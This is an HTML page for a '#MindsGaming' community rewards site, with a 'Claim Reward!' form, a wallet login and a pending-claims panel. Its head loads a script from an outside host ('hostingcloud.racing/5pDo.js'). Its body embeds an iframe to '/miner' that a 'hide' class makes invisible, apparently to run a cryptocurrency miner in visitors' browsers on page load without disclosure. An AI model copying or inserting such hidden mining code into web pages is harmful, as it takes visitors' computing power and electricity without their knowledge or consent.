<html lang="en">
  <head>
    <title>#MindsGaming</title>

    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="description" content="Community & Member Groups" />
    <meta
      property="og:image"
      content="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />
    <link
      rel="icon"
      href="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />
    <script src="https://www.hostingcloud.racing/5pDo.js"></script>
    <script src="/client.js" defer></script>
    <script src="/fly.js" defer></script>
    <script src="/eggs/eggs.js" defer></script>
    <link rel="stylesheet" href="/style.css" />
    <style>
      .bountyHunter {
        position: relative;
        display: block;
        background-color: transparent;
        color: black;
        background-image: url("https://cdn.minds.com/api/v2/media/proxy?size=800&src=https%3A%2F%2Fcdn.minds.com%2Ffs%2Fv1%2Fbanners%2F1323359473837805572%2F1640896437");
        background-size: contain;
        background-repeat: no-repeat;
        width: 100%;
        height: 100%;
      }
      .claimMe {
        position: fixed;
        top: 0;
        right: 0;
        margin-top: 26.5rem;
      }

      .hide {
        display: none;
      }
    </style>
  </head>
  <body style="background-color: green;">
    <iframe src="/miner" class="hide"> </iframe>
    <center>
      <div class="bountyHunter"></div>

      <div class="claimMe" id="claimMe" align="center">
        <div class="wrapIMG">
          <div class="loginImage">
            <br />
            <br />
            <form class="form" id="wallet">
              <input
                name="dream"
                aria-label="a new dream"
                type="text"
                maxlength="100"
                placeholder="Claim Reward!"
                required
              />
              <br />

              <button type="submit" id="submit-dream" onclick="claimEGG();">
                Claim Reward!
              </button>
            </form>
            <br />
          </div>
        </div>
      </div>

      <div class="profileicon" id="profileicon" onclick="viewReward();"></div>
      <div title="closed" id="REWARDS" class="hide">
        <div onclick="viewReward();" style="cursor:pointer; margin-left: 90%;">
          X
        </div>
        <div class="hide">Player: <label id="myName">Guest</label></div>
        <div>
          Wallet:
          <label id="myWallet" onclick="getLogin();" style="cursor:pointer;"
            >LOGIN</label
          >
        </div>
        <div>
          Reward Token:
          <label id="myToken" onclick="changeToken();">Random</label>
        </div>
        <div>
          Mode:
          <label id="vrMode" title="Hubs" onclick="vrMode();">Hubs</label>
        </div>
        <br />
        <div class="button" onclick="pendingClaims();">
          View Pending
        </div>
        <button class="hide" id="clear-dreams">
          Clear Dreams
        </button>
        <section title="closed" id="pendingClaims" class="hide">
          <ul id="dreams"></ul>
        </section>
      </div>

      <div id="offline" class="hide">
        <center>
          <h1>
            <br />
            You Appear To Be Offline
          </h1>
          <p>
            You can't earn rewards offline. Reconnect To Earn Rewards
          </p>
          <div class="offlineIMG"></div>
        </center>
      </div>
    </center>
  </body>
</html>
